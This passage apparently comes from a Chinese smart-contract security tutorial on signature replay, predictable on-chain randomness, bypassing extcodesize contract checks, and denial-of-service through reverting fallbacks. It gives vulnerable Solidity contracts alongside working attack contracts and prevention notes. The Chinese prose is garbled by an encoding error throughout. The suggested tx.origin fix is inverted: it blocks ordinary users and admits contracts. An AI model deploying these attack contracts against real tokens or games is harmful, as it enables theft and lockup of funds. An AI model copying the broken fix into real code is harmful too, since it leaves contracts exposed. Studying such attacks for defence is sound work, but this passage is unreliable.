0xb4a4ba10fbd6886a312ec31c54137f5714ddc0e93274da8746a36d2fa96768be */ function getMessageHash(address to, uint256 amount) public pure returns(bytes32)&#123; return keccak256(abi.encodePacked(to, amount)); &#125; /** * @dev è·å¾—ä»¥å¤ªåŠç­¾åæ¶ˆæ¯ * `hash`ï¼šæ¶ˆæ¯å“ˆå¸Œ * éµä»ä»¥å¤ªåŠç­¾åæ ‡å‡†ï¼šhttps://eth.wiki/json-rpc/API#eth_sign[`eth_sign`] * ä»¥åŠ`EIP191`:https://eips.ethereum.org/EIPS/eip-191` * æ·»åŠ &quot;\\x19Ethereum Signed Message:\\n32&quot;å­—æ®µï¼Œé˜²æ­¢ç­¾åçš„æ˜¯å¯æ‰§è¡Œäº¤æ˜“ã€‚ */ function toEthSignedMessageHash(bytes32 hash) public pure returns (bytes32) &#123; // 32 is the length in bytes of hash, // enforced by the type signature above return keccak256(abi.encodePacked(&quot;\\x19Ethereum Signed Message:\\n32&quot;, hash)); &#125; // ECDSAéªŒè¯ function verify(bytes32 _msgHash, bytes memory _signature) public view returns (bool)&#123; return ECDSA.recover(_msgHash, _signature) == signer; &#125; æ³¨æ„ é“¸é€ å‡½æ•° badMint() æ²¡æœ‰å¯¹ signature æŸ¥é‡ï¼Œå¯¼è‡´åŒæ ·çš„ç­¾åå¯ä»¥å¤šæ¬¡ä½¿ç”¨ï¼Œæ— é™é“¸é€ ä»£å¸ 12345function badMint(address to, uint amount, bytes memory signature) public &#123; bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encodePacked(to, amount))); require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;); _mint(to, amount);&#125; ç®€å•æ¥è¯´å°±æ˜¯ï¼Œå­¦æ ¡ç»™ä½ ä¸€å¼ å…è´¹é¤åˆ¸ï¼ŒæŒ‰ç…§å¸¸ç†æ¥è¯´ï¼Œä¸€å¼ åˆé¤åˆ¸åªèƒ½ä½¿ç”¨ä¸€æ¬¡ï¼Œä½†æ˜¯é£Ÿå ‚é˜¿å§¨å¥¹ä¸æ”¶èµ°ä½ çš„å…è´¹åˆé¥­åˆ¸ï¼Œä»¥è‡´äºä¸‹æ¬¡ä½ ç»§ç»­æ‹¿ç€è¿™å¼ å…è´¹é¤åˆ¸æ¥åƒé¥­ï¼Œé˜¿å§¨åˆä¸æ”¶èµ°ï¼Œç„¶åä½ å°±ä¸€ç›´é ç€è¿™å¼ é¤åˆ¸ç™½åƒç™½å–ã€‚ 5.2 é¢„é˜²ç­¾åé‡æ”¾æ”»å‡»ä¸»è¦æœ‰ä¸¤ç§é¢„é˜²åŠæ³• æ–¹æ³•ä¸€ï¼šå°†ä½¿ç”¨è¿‡çš„ç­¾åè®°å½•ä¸‹æ¥ï¼Œæ¯”å¦‚è®°å½•ä¸‹å·²ç»é“¸é€ ä»£å¸çš„åœ°å€ mintedAddressï¼Œé˜²æ­¢ç­¾ååå¤ä½¿ç”¨ 12345678910111213mapping(address =&gt; bool) public mintedAddress; // è®°å½•å·²ç»mintçš„åœ°å€function goodMint(address to, uint amount, bytes memory signature) public &#123; bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount)); require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;); // æ£€æŸ¥è¯¥åœ°å€æ˜¯å¦mintè¿‡ require(!mintedAddress[to], &quot;Already minted&quot;); // è®°å½•mintè¿‡çš„åœ°å€ mintedAddress[to] = true; _mint(to, amount);&#125;```solidity æ–¹æ³•äºŒï¼šå°† nonce ï¼ˆæ•°å€¼éšæ¯æ¬¡äº¤æ˜“é€’å¢ï¼‰å’Œ chainid ï¼ˆé“¾IDï¼‰åŒ…å«åœ¨ç­¾åæ¶ˆæ¯ä¸­ï¼Œè¿™æ ·å¯ä»¥é˜²æ­¢æ™®é€šé‡æ”¾å’Œè·¨é“¾é‡æ”¾æ”»å‡» 12345678uint nonce;function nonceMint(address to, uint amount, bytes memory signature) public &#123; bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encodePacked(to, amount, nonce, block.chainid))); require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;); _mint(to, amount); nonce++;&#125; 6. åéšæœºæ•°å¾ˆå¤šä»¥å¤ªåŠä¸Šçš„åº”ç”¨éƒ½éœ€è¦ç”¨åˆ°éšæœºæ•°ï¼Œä¾‹å¦‚NFTéšæœºæŠ½å–tokenIdã€æŠ½ç›²ç›’ã€gamefiæˆ˜æ–—ä¸­éšæœºåˆ†èƒœè´Ÿç­‰ç­‰ã€‚ä½†æ˜¯ç”±äºä»¥å¤ªåŠä¸Šæ‰€æœ‰æ•°æ®éƒ½æ˜¯å…¬å¼€é€æ˜ï¼ˆpublicï¼‰ä¸”ç¡®å®šæ€§ï¼ˆdeterministicï¼‰çš„ï¼Œå®ƒæ²¡æœ‰å…¶ä»–ç¼–ç¨‹è¯­è¨€ä¸€æ ·ç»™å¼€å‘è€…æä¾›ç”Ÿæˆéšæœºæ•°çš„æ–¹æ³•ï¼Œä¾‹å¦‚random()ã€‚å¾ˆå¤šé¡¹ç›®æ–¹ä¸å¾—ä¸ä½¿ç”¨é“¾ä¸Šçš„ä¼ªéšæœºæ•°ç”Ÿæˆæ–¹æ³•ï¼Œä¾‹å¦‚ blockhash() å’Œ keccak256() æ–¹æ³•ã€‚ åéšæœºæ•°æ¼æ´ï¼šæ”»å‡»è€…å¯ä»¥äº‹å…ˆè®¡ç®—è¿™äº›ä¼ªéšæœºæ•°çš„ç»“æœï¼Œä»è€Œè¾¾åˆ°ä»–ä»¬æƒ³è¦çš„ç›®çš„ï¼Œä¾‹å¦‚é“¸é€ ä»»ä½•ä»–ä»¬æƒ³è¦çš„ç¨€æœ‰NFTè€ŒééšæœºæŠ½å– 6.1 å¤ç°æ¡ˆä¾‹ 123456789101112131415contract BadRandomness is ERC721 &#123; uint256 totalSupply; // æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–NFTåˆé›†çš„åç§°ã€ä»£å· constructor() ERC721(&quot;&quot;, &quot;&quot;)&#123;&#125; // é“¸é€ å‡½æ•°ï¼šå½“è¾“å…¥çš„ luckyNumber ç­‰äºéšæœºæ•°æ—¶æ‰èƒ½mint function luckyMint(uint256 luckyNumber) external &#123; uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number require(randomNumber == luckyNumber, &quot;Better luck next time!&quot;); _mint(msg.sender, totalSupply); // mint totalSupply++; &#125;&#125; ä¼ªéšæœºæ•°ä½¿ç”¨ blockhash å’Œ block.timestamp å£°ç§° æ”»å‡»åˆçº¦ 12345678910contract Attack &#123; function attackMint(BadRandomness nftAddr) external &#123; // æå‰è®¡ç®—éšæœºæ•° uint256 luckyNumber = uint256( keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)) ) % 100; // åˆ©ç”¨ luckyNumber æ”»å‡» nftAddr.luckyMint(luckyNumber); &#125;&#125; åˆ†æï¼š æ”»å‡»å‡½æ•° attackMint()ä¸­çš„å‚æ•°ä¸º BadRandomnessåˆçº¦åœ°å€ã€‚åœ¨å…¶ä¸­ï¼Œæˆ‘ä»¬è®¡ç®—äº†éšæœºæ•° luckyNumberï¼Œç„¶åå°†å®ƒä½œä¸ºå‚æ•°è¾“å…¥åˆ° luckyMint() å‡½æ•°å®Œæˆæ”»å‡»ã€‚ç”±äºattackMint()å’ŒluckyMint()å°†åœ¨åŒä¸€ä¸ªåŒºå—ä¸­è°ƒç”¨ï¼Œblockhashå’Œblock.timestampæ˜¯ç›¸åŒçš„ï¼Œåˆ©ç”¨ä»–ä»¬ç”Ÿæˆçš„éšæœºæ•°ä¹Ÿç›¸åŒã€‚è¿™ä¸ªæ¼æ´åœ¨ æ­¤é¶åœºä¸­æœ‰è€ƒå¯Ÿè¿‡ã€‚ 6.2 é¢„é˜²æˆ‘ä»¬é€šå¸¸ä½¿ç”¨é¢„è¨€æœºé¡¹ç›®æä¾›çš„é“¾ä¸‹éšæœºæ•°æ¥é¢„é˜²è¿™ç±»æ¼æ´ï¼Œä¾‹å¦‚ Chainlink VRFã€‚è¿™ç±»éšæœºæ•°ä»é“¾ä¸‹ç”Ÿæˆï¼Œç„¶åä¸Šä¼ åˆ°é“¾ä¸Šï¼Œä»è€Œä¿è¯éšæœºæ•°ä¸å¯é¢„æµ‹ã€‚æ›´å¤šä»‹ç»å¯ä»¥é˜…è¯» WTF Solidityæç®€æ•™ç¨‹ ç¬¬39è®²ï¼šä¼ªéšæœºæ•°ã€‚ 7. ç»•è¿‡åˆçº¦é•¿åº¦æ£€æŸ¥å¾ˆå¤š freemint çš„é¡¹ç›®ä¸ºäº†é™åˆ¶ç§‘å­¦å®¶ï¼ˆç¨‹åºå‘˜ï¼‰ä¼šç”¨åˆ° isContract() æ–¹æ³•ï¼Œå¸Œæœ›å°†è°ƒç”¨è€… msg.sender é™åˆ¶ä¸ºå¤–éƒ¨è´¦æˆ·ï¼ˆEOAï¼‰ï¼Œè€Œéåˆçº¦ã€‚è¿™ä¸ªå‡½æ•°åˆ©ç”¨ extcodesize è·å–è¯¥åœ°å€æ‰€å­˜å‚¨çš„ bytecode é•¿åº¦ï¼ˆruntimeï¼‰ï¼Œè‹¥å¤§äº0ï¼Œåˆ™åˆ¤æ–­ä¸ºåˆçº¦ï¼Œå¦åˆ™å°±æ˜¯EOAï¼ˆç”¨æˆ·ï¼‰ã€‚ 7.1 å¤ç°12345678910// åˆ©ç”¨ extcodesize æ£€æŸ¥æ˜¯å¦ä¸ºåˆçº¦function isContract(address account) public view returns (bool) &#123; // extcodesize &gt; 0 çš„åœ°å€ä¸€å®šæ˜¯åˆçº¦åœ°å€ // ä½†æ˜¯åˆçº¦åœ¨æ„é€ å‡½æ•°æ—¶å€™ extcodesize ä¸º0 uint size; assembly &#123; size := extcodesize(account) &#125; return size &gt; 0;&#125; è¿™é‡Œæœ‰ä¸€ä¸ªæ¼æ´ï¼Œå°±æ˜¯åœ¨åˆçº¦åœ¨è¢«åˆ›å»ºçš„æ—¶å€™ï¼Œruntime bytecode è¿˜æ²¡æœ‰è¢«å­˜å‚¨åˆ°åœ°å€ä¸Šï¼Œå› æ­¤ bytecode é•¿åº¦ä¸º0ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬å°†é€»è¾‘å†™åœ¨åˆçº¦çš„æ„é€ å‡½æ•° constructor ä¸­çš„è¯ï¼Œå°±å¯ä»¥ç»•è¿‡ isContract() æ£€æŸ¥ã€‚ æ€ä¹ˆç†è§£å‘¢ï¼Œextcodesizeç»Ÿè®¡çš„æ˜¯éƒ¨ç½²åˆ°åŒºå—é“¾ä¸Šçš„åˆçº¦ä»£ç å¤§å°ï¼Œè€Œåˆçº¦æœªåˆå§‹åŒ–å®Œæˆçš„æ—¶å€™ï¼Œå°±ä¸ä¼šä¸Šé“¾ï¼Œæ­¤æ—¶ç»Ÿè®¡è¯¥åˆçº¦çš„ä»£ç å¤§å°ä¹Ÿæ˜¯ä¸º0ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡åˆçº¦æ£€æŸ¥äº†ã€‚ ç¤ºä¾‹ ContractCheckåˆçº¦æ˜¯ä¸€ä¸ª freemint ERC20 åˆçº¦ï¼Œé“¸é€ å‡½æ•° mint() ä¸­ä½¿ç”¨äº† isContract() å‡½æ•°æ¥é˜»æ­¢åˆçº¦åœ°å€çš„è°ƒç”¨ï¼Œé˜²æ­¢ç§‘å­¦å®¶æ‰¹é‡é“¸é€ ã€‚æ¯æ¬¡è°ƒç”¨ mint() å¯ä»¥é“¸é€  100 æšä»£å¸ã€‚ 12345678910111213141516171819202122// ç”¨extcodesizeæ£€æŸ¥æ˜¯å¦ä¸ºåˆçº¦åœ°å€contract ContractCheck is ERC20 &#123; // æ„é€ å‡½æ•°ï¼šåˆå§‹åŒ–ä»£å¸åç§°å’Œä»£å· constructor() ERC20(&quot;&quot;, &quot;&quot;) &#123;&#125; // åˆ©ç”¨ extcodesize æ£€æŸ¥æ˜¯å¦ä¸ºåˆçº¦ function isContract(address account) public view returns (bool) &#123; // extcodesize &gt; 0 çš„åœ°å€ä¸€å®šæ˜¯åˆçº¦åœ°å€ // ä½†æ˜¯åˆçº¦åœ¨æ„é€ å‡½æ•°æ—¶å€™ extcodesize ä¸º0 uint size; assembly &#123; size := extcodesize(account) &#125; return size &gt; 0; &#125; // mintå‡½æ•°ï¼Œåªæœ‰éåˆçº¦åœ°å€èƒ½è°ƒç”¨ï¼ˆæœ‰æ¼æ´ï¼‰ function mint() public &#123; require(!isContract(msg.sender), &quot;Contract not allowed!&quot;); _mint(msg.sender, 100); &#125;&#125; å†™ä¸€ä¸ªæ”»å‡»åˆçº¦ï¼Œåœ¨ constructor ä¸­å¤šæ¬¡è°ƒç”¨ ContractCheck åˆçº¦ä¸­çš„ mint() å‡½æ•°ï¼Œæ‰¹é‡é“¸é€  1000 æšä»£å¸ã€‚ 1234567891011121314151617181920// åˆ©ç”¨æ„é€ å‡½æ•°çš„ç‰¹ç‚¹æ”»å‡»contract NotContract &#123; bool public isContract; address public contractCheck; // å½“åˆçº¦æ­£åœ¨è¢«åˆ›å»ºæ—¶ï¼Œextcodesize (ä»£ç é•¿åº¦) ä¸º 0ï¼Œå› æ­¤ä¸ä¼šè¢« isContract() æ£€æµ‹å‡ºã€‚ constructor(address addr) &#123; contractCheck = addr; isContract = ContractCheck(addr).isContract(address(this)); // This will work for(uint i; i &lt; 10; i++)&#123; ContractCheck(addr).mint(); &#125; &#125; // åˆçº¦åˆ›å»ºå¥½ä»¥åï¼Œextcodesize &gt; 0ï¼ŒisContract() å¯ä»¥æ£€æµ‹ function mint() external &#123; ContractCheck(contractCheck).mint(); &#125;&#125; è°ƒç”¨NotContract åˆçº¦çš„ mint() å‡½æ•°ï¼Œç”±äºæ­¤æ—¶åˆçº¦å·²ç»éƒ¨ç½²å®Œæˆï¼Œè°ƒç”¨ mint() å‡½æ•°å°†å¤±è´¥ã€‚ 7.2 é¢„é˜²å¯ä»¥ä½¿ç”¨ (tx.origin == msg.sender) æ¥æ£€æµ‹è°ƒç”¨è€…æ˜¯å¦ä¸ºåˆçº¦ã€‚å¦‚æœè°ƒç”¨è€…ä¸º EOAï¼Œé‚£ä¹ˆtx.originå’Œmsg.senderç›¸ç­‰ï¼›å¦‚æœå®ƒä»¬ä¿©ä¸ç›¸ç­‰ï¼Œè°ƒç”¨è€…ä¸ºåˆçº¦ã€‚ åœ¨åŸæ¥çš„åˆçº¦ä¸Šæ·»åŠ æ­¤å‡½æ•°ï¼Œä¸”mintå‡½æ•°ä¸­æ–­è¨€ä¹Ÿéœ€è¦ä¿®æ”¹ã€‚ 123456789function realContract(address account) public view returns (bool) &#123; return (tx.origin == account);&#125;function mint() public &#123; require(!realContract(msg.sender), &quot;Contract not allowed!&quot;); _mint(msg.sender, 100);&#125; åˆ†æï¼Œtx.originè‚¯å®šæ˜¯ä¸€ä¸ªEOAè´¦æˆ·ï¼Œå¦‚æœmsg.senderä¸æ˜¯ä¸€ä¸ªEOAè´¦æˆ·çš„è¯ï¼Œå°†æ— æ³•é€šè¿‡è¯¥æ–­è¨€ã€‚ 8. æ‹’ç»æœåŠ¡æ”»å‡»DoS æ˜¯ Denial of service çš„ç®€ç§°ï¼Œå³æ‹’ç»æœåŠ¡ï¼Œä»»ä½•å¯¹æœåŠ¡çš„å¹²æ¶‰ï¼Œä½¿å¾—å…¶å¯ç”¨æ€§é™ä½æˆ–è€…å¤±å»å¯ç”¨æ€§å‡ç§°ä¸ºæ‹’ç»æœåŠ¡ã€‚åœ¨ Web3ï¼Œå®ƒæŒ‡çš„æ˜¯åˆ©ç”¨æ¼æ´ä½¿å¾—æ™ºèƒ½åˆçº¦æ— æ³•æ­£å¸¸æä¾›æœåŠ¡ã€‚ æ™ºèƒ½åˆçº¦æ‹’ç»æœåŠ¡æ”»å‡»ï¼šå¯ä»¥å¯¼è‡´æ™ºèƒ½åˆçº¦æ— æ³•æ­£å¸¸ä½¿ç”¨çš„ä»£ç é€»è¾‘é”™è¯¯ï¼Œå…¼å®¹æ€§é”™è¯¯æˆ–è°ƒç”¨æ·±åº¦è¿‡å¤§ï¼ˆåŒºå—é“¾è™šæ‹Ÿæœºçš„ç‰¹æ€§ï¼‰çš„å®‰å…¨é—®é¢˜ã€‚æ™ºèƒ½åˆçº¦ä¸­çš„æ‹’ç»æœåŠ¡æ”»å‡»æ‰‹æ³•å°±ç›¸å¯¹æ¯”è¾ƒç®€å•ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºä»¥ä¸‹ä¸‰ç§ï¼š 1ã€åŸºäºä»£ç é€»è¾‘çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼šè¿™ç§ç±»å‹çš„æ‹’ç»æœåŠ¡æ”»å‡»ä¸€èˆ¬æƒ…å†µä¸‹æ˜¯å› ä¸ºåˆçº¦ä»£ç é€»è¾‘çš„ä¸ä¸¥è°¨é€ æˆçš„ï¼Œæœ€å…¸å‹çš„å°±æ˜¯å½“åˆçº¦ä¸­å­˜åœ¨å¯¹ä¼ å…¥çš„æ˜ å°„æˆ–æ•°ç»„å¾ªç¯éå†çš„é€»è¾‘ä¸”æ²¡æœ‰é™åˆ¶ä¼ å…¥çš„æ˜ å°„æˆ–æ•°ç»„çš„é•¿åº¦æ—¶æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¼ å…¥è¶…é•¿çš„æ˜ å°„æˆ–è€…æ•°ç»„è¿›è¡Œå¾ªç¯éå†è€Œå¤§é‡æ¶ˆè€— Gas ä»è€Œè¯¥ç¬”äº¤æ˜“çš„ Gas æº¢å‡ºï¼Œæœ€åä½¿å¾—æ™ºèƒ½åˆçº¦æš‚æ—¶æˆ–æ°¸ä¹…ä¸å¯æ“ä½œã€‚ 2ã€åŸºäºå¤–éƒ¨è°ƒç”¨çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼šè¿™ç§æ‹’ç»æœåŠ¡æ”»å‡»æ˜¯å»ºç«‹åœ¨åˆçº¦ä¸­å¯¹å¤–éƒ¨è°ƒç”¨å¤„ç†ä¸å½“å¯¼è‡´çš„ã€‚ä¾‹å¦‚æ™ºèƒ½åˆçº¦ä¸­å­˜åœ¨åŸºäºå¤–éƒ¨å‡½æ•°æ‰§è¡Œçš„ç»“æ¥æ”¹å˜åˆçº¦çŠ¶æ€ä¸”æ²¡æœ‰å¯¹äº¤æ˜“ä¸€ç›´å¤±è´¥çš„æƒ…å†µåšå‡ºå¤„ç†ï¼Œæ”»å‡»è€…ä¼šåˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹æ•…æ„ä½¿äº¤æ˜“å¤±è´¥ï¼Œæ™ºèƒ½åˆçº¦åˆ™ä¼šä¸€ç›´é‡å¤è¿™ç¬”å¤±è´¥çš„äº¤æ˜“ä»è€Œé€ æˆæ™ºèƒ½åˆçº¦é€»è¾‘å¡åœ¨è¿™é‡Œä¸èƒ½ç»§ç»­æ‰§è¡Œï¼Œæœ€åä½¿å¾—æ™ºèƒ½åˆçº¦æš‚æ—¶æˆ–æ°¸ä¹…ä¸å¯æ“ä½œã€‚ 3ã€åŸºäºè¿è¥ç®¡ç†çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼šè¿™ç§æ‹’ç»æœåŠ¡æ”»å‡»å°±æ˜¯å»ºç«‹åœ¨åæœŸè¿è¥æƒ…å†µä¸‹ï¼Œä¾‹å¦‚åœ¨æ™ºèƒ½åˆçº¦ä¸­é€šå¸¸ä¼šå­˜åœ¨ä»¥ Owner è´¦æˆ·ä½œä¸ºç®¡ç†å‘˜è§’è‰²ï¼Œè¯¥è§’è‰²é€šå¸¸ä¼šæŒæœ‰å¾ˆé«˜çš„æƒé™ï¼Œä¾‹å¦‚å¼€å¯æˆ–æš‚åœè½¬è´¦åŠŸèƒ½ï¼Œå½“ Owner è§’è‰²æ“ä½œå¤±è¯¯æˆ–ç§é’¥ä¸¢å¤±å¯èƒ½ä¼šå—åˆ°éä¸»è§‚æ„ä¹‰ä¸Šçš„æ‹’ç»æœåŠ¡æ”»å‡»ã€‚ 8.1 å¤ç°åŸºäºå¤–éƒ¨è°ƒç”¨çš„æ‹’ç»æœåŠ¡æ”»å‡» ç¤ºä¾‹ä¸€ 123456789101112131415161718192021// SPDX-License-Identifier: MITpragma solidity ^0.8.13;contract KingOfEther &#123; address public king; uint public balance; function claimThrone() external payable &#123; require(msg.value &gt; balance, &quot;Need to pay more to become the king&quot;); (bool sent, ) = king.call&#123;value: balance&#125;(&quot;&quot;); require(sent, &quot;Failed to send Ether&quot;); balance = msg.value; king = msg.sender; &#125;&#125; Hacker 12345678910111213141516171819// SPDX-License-Identifier: MITpragma solidity ^0.8.13;contract Attack &#123; KingOfEther kingOfEther; constructor(KingOfEther _kingOfEther) &#123; kingOfEther = KingOfEther(_kingOfEther); &#125; function attack() public payable &#123; kingOfEther.claimThrone&#123;value: msg.value&#125;(); &#125;&#125; åˆ†æ ï¼ˆè¿™é‡Œå¼•ç”¨äº†æ…¢é›¾çš„åˆ†æï¼Œæ„Ÿè§‰åˆ†æå¾—å¾ˆæœ‰æ„æ€ï¼‰ é¦–å…ˆæˆ‘ä»¬å…ˆæ¥åˆ†ææ”»å‡»æµç¨‹ï¼š Alice éƒ¨ç½² KingOfEther åˆçº¦ã€‚ Alice è°ƒç”¨ KingOfEther.claimThrone() å‘é€ 1 ä¸ªä»¥å¤ªåˆ° KingOfEther åˆçº¦ä¸­æˆä¸ºã€Œä»¥å¤ªä¹‹ç‹ã€ã€‚ é«˜å¯Œå¸… Bob è°ƒç”¨ KingOfEther.claimThrone() å‘é€ 2 ä¸ªä»¥å¤ªåˆ° KingOfEther åˆçº¦ä¸­æˆä¸ºæ–°ç‹ã€‚ Alice æ”¶åˆ° 1 ä¸ªä»¥å¤ªå¸çš„é€€æ¬¾ã€‚ Eve ä½¿ç”¨ KingOfEther çš„åœ°å€éƒ¨ç½²æ”»å‡»åˆçº¦ Attackã€‚ Eve è°ƒç”¨ Attack.attack() å‘ KingOfEther åˆçº¦ä¸­å‘é€ 3 ä¸ªä»¥å¤ªã€‚ Attack åˆçº¦æˆä¸ºæ–°ç‹ã€‚ é«˜å¯Œå¸… Bob è§‰å¾—ä¸æœï¼Œå†æ¬¡è°ƒç”¨ KingOfEther.claimThrone() å‘ KingOfEther åˆçº¦ä¸­å‘é€äº† 20 ä¸ªä»¥å¤ªå±•ç°è‡ªå·±çš„ã€Œé’èƒ½åŠ›ã€ã€‚ Bob å‘ç°è‡ªå·±çš„äº¤æ˜“ä¸€ç›´è¢« revertï¼Œæ— æ³•æˆä¸ºæ–°ç‹ã€‚è‡³æ­¤ï¼ŒEve çš„æ”»å‡»ä½¿ KingOfEther åˆçº¦æ°¸ä¹…å¤±æ•ˆï¼ŒAttack åˆçº¦æˆä¸ºäº†æ°¸è¿œçš„ã€Œä»¥å¤ªä¹‹ç‹ã€ã€‚ é«˜å¯Œå¸… Bob è§‰å¾—ä¸å¯æ€è®®ï¼Œä¸ºå•¥è‡ªå·±è¿™ä¹ˆæœ‰é’±è¿˜ä¸èƒ½ç§°ç‹å‘¢ï¼Ÿæˆ‘ä»¬æ¥çœ‹çœ‹åˆ°åº•æ˜¯ä¸ºä»€ä¹ˆã€‚ å½“ Bob è°ƒç”¨ KingOfEther.claimThrone() å‘é€ 20 ä¸ªä»¥å¤ªåˆ° KingOfEther åˆçº¦æ—¶ä¼šè§¦å‘ KingOfEther.claimThrone() çš„é€€æ¬¾é€»è¾‘ï¼Œå°†ä¹‹å‰ Eve é€šè¿‡ Attack.attack() å‘ KingOfEther åˆçº¦ä¸­å‘é€çš„ 3 ä¸ªä»¥å¤ªåŸè·¯é€€å›åˆ° Attack åˆçº¦ã€‚æˆ‘ä»¬å†æ¥çœ‹ Attack åˆçº¦ï¼Œè¯¥åˆçº¦ä¸­æ²¡æœ‰å®ç° payable çš„ fallback() æ‰€ä»¥ä¸èƒ½æ¥æ”¶ä»¥å¤ªå¸ï¼Œè¿™å°†å¯¼è‡´ KingOfEther.claimThrone() çš„é€€æ¬¾é€»è¾‘ä¸€ç›´å¤±è´¥ï¼Œé€€æ¬¾è¿”å›å€¼ sent å°†ä¸€ç›´ä¸º false æ— æ³•é€šè¿‡ require(sent, â€œFailed to send Etherâ€) æ£€æŸ¥ä¸€ç›´è¢« revertã€‚å› ä¸ºåªè¦è§¦å‘é€€æ¬¾å°±ä¼šè¢« revert å¯¼è‡´ KingOfEther åˆçº¦ä¸­ç»§ Attack åˆçº¦åæ— äººèƒ½æˆä¸ºæ–°ç‹ï¼ŒEve æˆåŠŸå®Œæˆäº†æ‹’ç»æœåŠ¡æ”»å‡»ã€‚ ç¤ºä¾‹äºŒ 1234567891011121314151617181920212223242526272829303132333435363738// SPDX-License-Identifier: MITpragma solidity ^0.8.4;// æœ‰DoSæ¼æ´çš„æ¸¸æˆï¼Œç©å®¶ä»¬å…ˆå­˜é’±ï¼Œæ¸¸æˆç»“æŸåï¼Œè°ƒç”¨refundé€€é’±ã€‚contract DoSGame &#123; bool public refundFinished; mapping(address =&gt; uint256) public balanceOf; address[] public players; // æ‰€æœ‰ç©å®¶å­˜ETHåˆ°åˆçº¦é‡Œ function deposit() external payable &#123; require(!refundFinished, &quot;Game Over&quot;); require(msg.value &gt; 0, &quot;Please donate ETH&quot;); // è®°å½•å­˜æ¬¾ balanceOf[msg.sender] = msg.value; // è®°å½•ç©å®¶åœ°å€ players.push(msg.sender); &#125; // æ¸¸æˆç»“æŸï¼Œé€€æ¬¾å¼€å§‹ï¼Œæ‰€æœ‰ç©å®¶å°†ä¾æ¬¡æ”¶åˆ°é€€æ¬¾ function refund() external &#123; require(!refundFinished, &quot;Game Over&quot;); uint256 pLength = players.length; // é€šè¿‡å¾ªç¯ç»™æ‰€æœ‰ç©å®¶é€€æ¬¾ for(uint256 i; i &lt; pLength; i++)&#123; address player = players[i]; uint256 refundETH = balanceOf[player]; (bool success, ) = player.call&#123;value: refundETH&#125;(&quot;&quot;); require(success, &quot;Refund Fail!&quot;); balanceOf[player] = 0; &#125; refundFinished = true; &#125; function balance() external view returns(uint256)&#123; return address(this).balance; &#125;&#125; æ¼æ´åœ¨äºï¼Œrefund() å‡½æ•°ä¸­åˆ©ç”¨å¾ªç¯é€€æ¬¾çš„æ—¶å€™ï¼Œæ˜¯ä½¿ç”¨çš„ call å‡½æ•°ï¼Œå°†æ¿€æ´»ç›®æ ‡åœ°å€çš„å›è°ƒå‡½æ•°ï¼Œå¦‚æœç›®æ ‡åœ°å€ä¸ºä¸€ä¸ªæ¶æ„åˆçº¦ï¼Œåœ¨å›è°ƒå‡½æ•°ä¸­åŠ å…¥äº†æ¶æ„é€»è¾‘ï¼Œé€€æ¬¾å°†ä¸èƒ½æ­£å¸¸è¿›è¡Œã€‚å¦‚ä½•å¦‚ä½•ç†è§£å‘¢ï¼Œcallè½¬è´¦ï¼Œä¾¿ä¼šè§¦å‘ç›®æ ‡åœ°å€çš„å›é€€å‡½æ•°ï¼Œå¦‚æœåœ¨å›é€€å‡½æ•°ä¸­åŠ å…¥revert();è¯­å¥ï¼Œæ­¤æ—¶successçš„å€¼æ°¸è¿œéƒ½æ˜¯falseï¼Œå¾ªç¯å°†è¢«è¿«ç»ˆæ­¢ï¼Œä»è€Œä½¿å¾—Hackerä¹‹åçš„ç”¨æˆ·æ°¸è¿œæ— æ³•å–æ¬¾ã€‚ Hacker 123456789101112contract Hacker &#123; // é€€æ¬¾æ—¶è¿›è¡ŒDoSæ”»å‡» fallback() external payable&#123; revert(&quot;DoS Attack!&quot;); &#125; // å‚ä¸DoSæ¸¸æˆå¹¶å­˜æ¬¾ function attack(address gameAddr) external payable &#123; DoSGame dos = DoSGame(gameAddr); dos.deposit&#123;value: msg.value&#125;(); &#125;&#125; attack() å‡½æ•°ä¸­å°†è°ƒç”¨ DoSGame åˆçº¦çš„ deposit() å­˜æ¬¾å¹¶å‚ä¸æ¸¸æˆï¼›fallback() å›è°ƒå‡½æ•°å°†å›é€€æ‰€æœ‰å‘è¯¥åˆçº¦å‘é€ETHçš„äº¤æ˜“ï¼Œå¯¹DoSGame åˆçº¦ä¸­çš„ DoS æ¼æ´è¿›è¡Œäº†æ”»å‡»ï¼Œæ‰€æœ‰é€€æ¬¾å°†ä¸èƒ½æ­£å¸¸è¿›è¡Œï¼Œèµ„é‡‘è¢«é”åœ¨åˆçº¦ä¸­ï¼Œå°±åƒ Akutar åˆçº¦ä¸­çš„ä¸€ä¸‡å¤šæš ETH ä¸€æ ·ã€‚ 8.2 é¢„é˜²æ–¹æ³• å¾ˆå¤šé€»è¾‘é”™è¯¯éƒ½å¯èƒ½å¯¼è‡´æ™ºèƒ½åˆçº¦æ‹’ç»æœåŠ¡ï¼Œæ‰€ä»¥å¼€å‘è€…åœ¨å†™æ™ºèƒ½åˆçº¦æ—¶è¦ä¸‡åˆ†è°¨æ…ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›éœ€è¦ç‰¹åˆ«æ³¨æ„çš„åœ°æ–¹ï¼š å¤–éƒ¨åˆçº¦çš„å‡½æ•°è°ƒç”¨ï¼ˆä¾‹å¦‚ callï¼‰å¤±è´¥æ—¶ä¸ä¼šä½¿å¾—é‡è¦åŠŸèƒ½å¡æ­»ï¼Œæ¯”å¦‚å°†ä¸Šé¢æ¼æ´åˆçº¦ä¸­çš„ require(success, &quot;Refund Fail!&quot;); å»æ‰ï¼Œé€€æ¬¾åœ¨å•ä¸ªåœ°å€å¤±è´¥æ—¶ä»èƒ½ç»§ç»­è¿è¡Œã€‚ 